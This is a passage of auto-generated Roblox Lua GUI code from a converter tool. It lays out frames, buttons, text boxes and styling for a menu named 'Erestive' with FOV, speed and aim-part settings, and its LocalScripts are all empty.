-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2e0"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["2e0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2e0"]["BackgroundTransparency"] = 1;
G2L["2e0"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.UICorner
G2L["2e1"] = Instance.new("UICorner", G2L["2de"]);
G2L["2e1"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Button
G2L["2e2"] = Instance.new("TextButton", G2L["2de"]);
G2L["2e2"]["TextWrapped"] = true;
G2L["2e2"]["TextSize"] = 14;
G2L["2e2"]["TextScaled"] = true;
G2L["2e2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["2e2"]["BackgroundTransparency"] = 1;
G2L["2e2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2e2"]["Text"] = [[ ]];
G2L["2e2"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Button.Animations
G2L["2e3"] = Instance.new("LocalScript", G2L["2e2"]);
G2L["2e3"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["2e4"] = Instance.new("LocalScript", G2L["2e2"]);
G2L["2e4"]["Enabled"] = false;
G2L["2e4"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.Text
G2L["2e5"] = Instance.new("TextLabel", G2L["2de"]);
G2L["2e5"]["TextWrapped"] = true;
G2L["2e5"]["ZIndex"] = 9;
G2L["2e5"]["TextSize"] = 14;
G2L["2e5"]["TextScaled"] = true;
G2L["2e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e5"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["2e5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e5"]["BackgroundTransparency"] = 1;
G2L["2e5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2e5"]["Text"] = [[Set Fov]];
G2L["2e5"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.SetFOV.UIGradient
G2L["2e6"] = Instance.new("UIGradient", G2L["2de"]);
G2L["2e6"]["Rotation"] = -90;
G2L["2e6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.FOVSet
G2L["2e7"] = Instance.new("TextBox", G2L["2dc"]);
G2L["2e7"]["Name"] = [[FOVSet]];
G2L["2e7"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["2e7"]["TextWrapped"] = true;
G2L["2e7"]["TextSize"] = 14;
G2L["2e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e7"]["TextScaled"] = true;
G2L["2e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["2e7"]["PlaceholderText"] = [[70]];
G2L["2e7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2e7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2e7"]["Text"] = [[]];
G2L["2e7"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.FOVConfig.UIStroke
G2L["2e8"] = Instance.new("UIStroke", G2L["2dc"]);
G2L["2e8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2e8"]["Thickness"] = 0.8;
G2L["2e8"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.UIGradient
G2L["2e9"] = Instance.new("UIGradient", G2L["2d7"]);
G2L["2e9"]["Rotation"] = -90;
G2L["2e9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.FOV.UIStroke
G2L["2ea"] = Instance.new("UIStroke", G2L["2d7"]);
G2L["2ea"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2ea"]["Thickness"] = 0.8;
G2L["2ea"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.Jump.UIListLayout
G2L["2eb"] = Instance.new("UIListLayout", G2L["2d6"]);
G2L["2eb"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5
G2L["2ec"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["2ec"]["Active"] = true;
G2L["2ec"]["ZIndex"] = 3;
G2L["2ec"]["BorderSizePixel"] = 0;
G2L["2ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ec"]["Name"] = [[Frame5]];
G2L["2ec"]["ScrollBarImageTransparency"] = 1;
G2L["2ec"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["2ec"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2ec"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ec"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["2ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ec"]["ScrollBarThickness"] = 0;
G2L["2ec"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.UIPadding
G2L["2ed"] = Instance.new("UIPadding", G2L["2ec"]);
G2L["2ed"]["PaddingTop"] = UDim.new(0, 5);
G2L["2ed"]["PaddingRight"] = UDim.new(0, 5);
G2L["2ed"]["PaddingLeft"] = UDim.new(0, 1);
G2L["2ed"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.UIGridLayout
G2L["2ee"] = Instance.new("UIGridLayout", G2L["2ec"]);
G2L["2ee"]["CellSize"] = UDim2.new(0, 145, 0, 40);
G2L["2ee"]["CellPadding"] = UDim2.new(0, 9, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF
G2L["2ef"] = Instance.new("Frame", G2L["2ec"]);
G2L["2ef"]["BorderSizePixel"] = 0;
G2L["2ef"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["2ef"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["2ef"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["2ef"]["Name"] = [[ONOFF]];
G2L["2ef"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.WhiteBar
G2L["2f0"] = Instance.new("Frame", G2L["2ef"]);
G2L["2f0"]["BorderSizePixel"] = 0;
G2L["2f0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f0"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["2f0"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["2f0"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2f0"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.WhiteBar.UIGradient
G2L["2f1"] = Instance.new("UIGradient", G2L["2f0"]);
G2L["2f1"]["Rotation"] = 90;
G2L["2f1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider
G2L["2f2"] = Instance.new("Frame", G2L["2ef"]);
G2L["2f2"]["BorderSizePixel"] = 0;
G2L["2f2"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["2f2"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["2f2"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["2f2"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Animations
G2L["2f3"] = Instance.new("LocalScript", G2L["2f2"]);
G2L["2f3"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Animations.Sample
G2L["2f4"] = Instance.new("ImageLabel", G2L["2f3"]);
G2L["2f4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f4"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2f4"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["2f4"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2f4"]["BackgroundTransparency"] = 1;
G2L["2f4"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.UICorner
G2L["2f5"] = Instance.new("UICorner", G2L["2f2"]);
G2L["2f5"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.UIGradient
G2L["2f6"] = Instance.new("UIGradient", G2L["2f2"]);
G2L["2f6"]["Rotation"] = -90;
G2L["2f6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Button
G2L["2f7"] = Instance.new("TextButton", G2L["2f2"]);
G2L["2f7"]["TextSize"] = 14;
G2L["2f7"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["2f7"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["2f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f7"]["ZIndex"] = 2;
G2L["2f7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2f7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2f7"]["Text"] = [[ ]];
G2L["2f7"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Button.LocalScript
G2L["2f8"] = Instance.new("LocalScript", G2L["2f7"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.Slider.Button.UICorner
G2L["2f9"] = Instance.new("UICorner", G2L["2f7"]);
G2L["2f9"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.OnOrOff
G2L["2fa"] = Instance.new("TextLabel", G2L["2ef"]);
G2L["2fa"]["TextWrapped"] = true;
G2L["2fa"]["ZIndex"] = 2;
G2L["2fa"]["TextSize"] = 14;
G2L["2fa"]["TextScaled"] = true;
G2L["2fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2fa"]["BackgroundTransparency"] = 1;
G2L["2fa"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["2fa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["2fa"]["Text"] = [[Off]];
G2L["2fa"]["Name"] = [[OnOrOff]];
G2L["2fa"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.UICorner
G2L["2fb"] = Instance.new("UICorner", G2L["2ef"]);
G2L["2fb"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.UIGradient
G2L["2fc"] = Instance.new("UIGradient", G2L["2ef"]);
G2L["2fc"]["Rotation"] = -90;
G2L["2fc"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.ImageLabel
G2L["2fd"] = Instance.new("ImageLabel", G2L["2ef"]);
G2L["2fd"]["BorderSizePixel"] = 0;
G2L["2fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2fd"]["Image"] = [[rbxassetid://15011030819]];
G2L["2fd"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["2fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2fd"]["BackgroundTransparency"] = 1;
G2L["2fd"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.ONOFF.UIStroke
G2L["2fe"] = Instance.new("UIStroke", G2L["2ef"]);
G2L["2fe"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart
G2L["2ff"] = Instance.new("Frame", G2L["2ec"]);
G2L["2ff"]["BorderSizePixel"] = 0;
G2L["2ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2ff"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["2ff"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["2ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2ff"]["Name"] = [[aimpart]];
G2L["2ff"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.LocalScript
G2L["300"] = Instance.new("LocalScript", G2L["2ff"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.UIListLayout
G2L["301"] = Instance.new("UIListLayout", G2L["2ff"]);
G2L["301"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV
G2L["302"] = Instance.new("Frame", G2L["2ff"]);
G2L["302"]["BorderSizePixel"] = 0;
G2L["302"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["302"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["302"]["Position"] = UDim2.new(-0.07586, 0, 0, 0);
G2L["302"]["Name"] = [[FOV]];
G2L["302"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.UICorner
G2L["303"] = Instance.new("UICorner", G2L["302"]);
G2L["303"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig
G2L["304"] = Instance.new("Frame", G2L["302"]);
G2L["304"]["BorderSizePixel"] = 0;
G2L["304"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["304"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["304"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["304"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.UICorner
G2L["305"] = Instance.new("UICorner", G2L["304"]);
G2L["305"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.UIListLayout
G2L["306"] = Instance.new("UIListLayout", G2L["304"]);
G2L["306"]["Padding"] = UDim.new(0, 10);
G2L["306"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton
G2L["307"] = Instance.new("TextButton", G2L["304"]);
G2L["307"]["TextWrapped"] = true;
G2L["307"]["BorderSizePixel"] = 0;
G2L["307"]["TextSize"] = 14;
G2L["307"]["TextScaled"] = true;
G2L["307"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["307"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["307"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["307"]["BackgroundTransparency"] = 1;
G2L["307"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["307"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["307"]["Text"] = [[Head]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton.LocalScript
G2L["308"] = Instance.new("LocalScript", G2L["307"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton.TextLabel
G2L["309"] = Instance.new("TextLabel", G2L["307"]);
G2L["309"]["TextWrapped"] = true;
G2L["309"]["BorderSizePixel"] = 0;
G2L["309"]["TextSize"] = 14;
G2L["309"]["TextScaled"] = true;
G2L["309"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["309"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["309"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["309"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["309"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["309"]["Text"] = [[Head]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.FOVConfig.TextButton.TextLabel.UICorner
G2L["30a"] = Instance.new("UICorner", G2L["309"]);
G2L["30a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.UIGradient
G2L["30b"] = Instance.new("UIGradient", G2L["302"]);
G2L["30b"]["Rotation"] = -90;
G2L["30b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.ImageLabel
G2L["30c"] = Instance.new("ImageLabel", G2L["302"]);
G2L["30c"]["BorderSizePixel"] = 0;
G2L["30c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["30c"]["Image"] = [[rbxassetid://7992557358]];
G2L["30c"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["30c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30c"]["BackgroundTransparency"] = 1;
G2L["30c"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.WhiteBar
G2L["30d"] = Instance.new("Frame", G2L["302"]);
G2L["30d"]["Visible"] = false;
G2L["30d"]["BorderSizePixel"] = 0;
G2L["30d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30d"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["30d"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["30d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["30d"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.WhiteBar.UIGradient
G2L["30e"] = Instance.new("UIGradient", G2L["30d"]);
G2L["30e"]["Rotation"] = 90;
G2L["30e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.FOV.UIStroke
G2L["30f"] = Instance.new("UIStroke", G2L["302"]);
G2L["30f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.TextLabel
G2L["310"] = Instance.new("TextLabel", G2L["2ff"]);
G2L["310"]["TextWrapped"] = true;
G2L["310"]["BorderSizePixel"] = 0;
G2L["310"]["TextSize"] = 14;
G2L["310"]["TextScaled"] = true;
G2L["310"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["310"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["310"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["310"]["Size"] = UDim2.new(0, 142, 0, 50);
G2L["310"]["Visible"] = false;
G2L["310"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["310"]["Text"] = [[Aim Pointer]];
G2L["310"]["Position"] = UDim2.new(-0.01379, 0, 1.15, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.aimpart.TextLabel.UICorner
G2L["311"] = Instance.new("UICorner", G2L["310"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2
G2L["312"] = Instance.new("Frame", G2L["2ec"]);
G2L["312"]["BorderSizePixel"] = 0;
G2L["312"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["312"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["312"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["312"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["312"]["Name"] = [[Speed2]];
G2L["312"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.LocalScript
G2L["313"] = Instance.new("LocalScript", G2L["312"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.UIListLayout
G2L["314"] = Instance.new("UIListLayout", G2L["312"]);
G2L["314"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV
G2L["315"] = Instance.new("Frame", G2L["312"]);
G2L["315"]["BorderSizePixel"] = 0;
G2L["315"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["315"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["315"]["Name"] = [[FOV]];
G2L["315"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.UICorner
G2L["316"] = Instance.new("UICorner", G2L["315"]);
G2L["316"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig
G2L["317"] = Instance.new("Frame", G2L["315"]);
G2L["317"]["BorderSizePixel"] = 0;
G2L["317"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["317"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["317"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["317"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.UICorner
G2L["318"] = Instance.new("UICorner", G2L["317"]);
G2L["318"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.FOVSet
G2L["319"] = Instance.new("TextBox", G2L["317"]);
G2L["319"]["Visible"] = false;
G2L["319"]["Name"] = [[FOVSet]];
G2L["319"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["319"]["TextWrapped"] = true;
G2L["319"]["TextSize"] = 14;
G2L["319"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["319"]["TextScaled"] = true;
G2L["319"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["319"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["319"]["ClearTextOnFocus"] = false;
G2L["319"]["PlaceholderText"] = [[Dis]];
G2L["319"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["319"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["319"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["319"]["Text"] = [[100]];
G2L["319"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.FOVSet.LocalScript
G2L["31a"] = Instance.new("LocalScript", G2L["319"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV
G2L["31b"] = Instance.new("Frame", G2L["317"]);
G2L["31b"]["Visible"] = false;
G2L["31b"]["ZIndex"] = 2;
G2L["31b"]["BorderSizePixel"] = 0;
G2L["31b"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["31b"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["31b"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["31b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["31b"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Animations
G2L["31c"] = Instance.new("LocalScript", G2L["31b"]);
G2L["31c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["31d"] = Instance.new("ImageLabel", G2L["31c"]);
G2L["31d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31d"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["31d"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["31d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["31d"]["BackgroundTransparency"] = 1;
G2L["31d"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.UICorner
G2L["31e"] = Instance.new("UICorner", G2L["31b"]);
G2L["31e"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Button
G2L["31f"] = Instance.new("TextButton", G2L["31b"]);
G2L["31f"]["TextWrapped"] = true;
G2L["31f"]["TextSize"] = 14;
G2L["31f"]["TextScaled"] = true;
G2L["31f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["31f"]["BackgroundTransparency"] = 1;
G2L["31f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["31f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["31f"]["Text"] = [[ ]];
G2L["31f"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Button.Animations
G2L["320"] = Instance.new("LocalScript", G2L["31f"]);
G2L["320"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.Text
G2L["321"] = Instance.new("TextLabel", G2L["31b"]);
G2L["321"]["TextWrapped"] = true;
G2L["321"]["ZIndex"] = 9;
G2L["321"]["TextSize"] = 14;
G2L["321"]["TextScaled"] = true;
G2L["321"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["321"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["321"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["321"]["BackgroundTransparency"] = 1;
G2L["321"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["321"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["321"]["Text"] = [[Set Speed]];
G2L["321"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame5.Speed2.FOV.FOVConfig.SetFOV.UIGradient
G2L["322"] = Instance.new("UIGradient", G2L["31b"]);
